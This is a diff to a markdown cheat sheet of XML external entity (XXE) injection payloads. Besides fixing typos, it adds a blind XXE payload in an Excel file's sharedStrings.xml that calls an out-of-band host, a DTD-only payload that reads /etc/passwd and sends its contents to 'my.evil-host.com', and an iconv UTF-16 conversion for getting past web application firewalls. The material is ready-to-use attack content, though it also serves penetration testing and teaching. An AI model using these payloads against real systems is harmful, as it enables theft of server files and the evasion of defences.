@@ -31,6 +31,8 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
   - [XXE inside SOAP](#xxe-inside-soap)
   - [XXE inside DOCX file](#xxe-inside-docx-file)
   - [XXE inside XLSX file](#xxe-inside-xlsx-file)
+  - [XXE inside DTD file](#xxe-inside-dtd-file)
+- [XXE WAF Bypass via convert character encoding](#xxe-waf-bypass-via-convert-character-encoding)
 
 ## Tools
 
@@ -72,7 +74,7 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
   ```
   ruby server.rb
   ```
-- [docem](https://github.com/whitel1st/docem) - Uility to embed XXE and XSS payloads in docx,odt,pptx,etc
+- [docem](https://github.com/whitel1st/docem) - Utility to embed XXE and XSS payloads in docx,odt,pptx,etc
   ```
   ./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_document -kt -sx docx
   ./docem.py -s samples/xxe/sample_oxml_xxe_mod1.docx -pm xxe -pf payloads/xxe_special_2.txt -kt -pt per_place
@@ -155,7 +157,7 @@ We try to display the content of the file `/etc/passwd`
   <contact>
     <name>Jean &xxe; Dupont</name>
     <phone>00 11 22 33 44</phone>
-    <adress>42 rue du CTF</adress>
+    <address>42 rue du CTF</address>
     <zipcode>75000</zipcode>
     <city>Paris</city>
   </contact>
@@ -461,7 +463,7 @@ GIF (experimental)
 
 Extract the excel file.
 
-```powershell
+```
 $ mkdir XXE && cd XXE
 $ unzip ../XXE.xlsx
 Archive:  ../XXE.xlsx
@@ -478,16 +480,24 @@ Archive:  ../XXE.xlsx
 
 Add your blind XXE payload inside `xl/workbook.xml`.
 
-```powershell
+```xml
 <xml...>
 <!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://YOURCOLLABORATORID.burpcollaborator.net/"> ]>
 <x>&xxe;</x>
 <workbook...>
 ```
 
+Alternativly, add your payload in `xl/sharedStrings.xml`:
+
+```xml
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE foo [ <!ELEMENT t ANY > <!ENTITY xxe SYSTEM "http://YOURCOLLABORATORID.burpcollaborator.net/"> ]>
+<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&xxe;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>
+```
+
 Rebuild the Excel file.
 
-```powershell
+```
 $ zip -r ../poc.xlsx *
 updating: [Content_Types].xml (deflated 71%)
 updating: _rels/ (stored 0%)
@@ -505,6 +515,32 @@ updating: xl/theme/theme1.xml (deflated 80%)
 updating: xl/_rels/ (stored 0%)
 updating: xl/_rels/workbook.xml.rels (deflated 66%)
 updating: xl/sharedStrings.xml (deflated 17%)
+```
+
+### XXE inside DTD file
+
+Most XXE payloads detailed above require control over both the DTD or `DOCTYPE` block as well as the `xml` file.
+In rare situations, you may only control the DTD file and won't be able to modify the `xml` file. For example, a MITM.
+When all you control is the DTD file, and you do not control the `xml` file, XXE may still be possible with this payload.
+
+```xml
+<!-- Load the contents of a sensitive file into a variable -->
+<!ENTITY % payload SYSTEM "file:///etc/passwd">
+<!-- Use that variable to construct an HTTP get request with the file contents in the URL -->
+<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://my.evil-host.com/x=%payload;">'>
+%param1;
+%external;
+```
+
+### XXE WAF Bypass via convert character encoding
+
+In XXE WAFs, DTD Prolog are usually blacklisted BUT not all WAFs blacklist the UTF-16 character encoding<br><br>
+`All XML processors must accept the UTF-8 and UTF-16 encodings of Unicode` 
+-- https://www.w3.org/XML/xml-V10-4e-errata#E11
+<br><br>
+we can convert the character encoding to `UTF-16` using [iconv](https://man7.org/linux/man-pages/man1/iconv.1.html) to bypass the XXE WAF:-<br>
+```bash
+cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
 ```
 
 
@@ -527,6 +563,7 @@ updating: xl/sharedStrings.xml (deflated 17%)
 * [Web Security Academy >> XML external entity (XXE) injection - 2019 PortSwigger Ltd](https://portswigger.net/web-security/xxe)
 * [Automating local DTD discovery for XXE exploitation](https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation) - July 16 2019 by Philippe Arteau
 * [EXPLOITING XXE WITH EXCEL - NOV 12 2018 - MARC WICKENDEN](https://www.4armed.com/blog/exploiting-xxe-with-excel/)
+* [excel-reader-xlsx #10](https://github.com/jmcnamara/excel-reader-xlsx/issues/10)
 * [Midnight Sun CTF 2019 Quals - Rubenscube](https://jbz.team/midnightsunctfquals2019/Rubenscube)
 * [SynAck - A Deep Dive into XXE Injection](https://www.synack.com/blog/a-deep-dive-into-xxe-injection/) - 22 July 2019 - Trenton Gordon
 * [Synacktiv - CVE-2019-8986: SOAP XXE in TIBCO JasperReports Server](https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf) - 11-03-2019 - Julien SZLAMOWICZ, Sebastien DUDEK
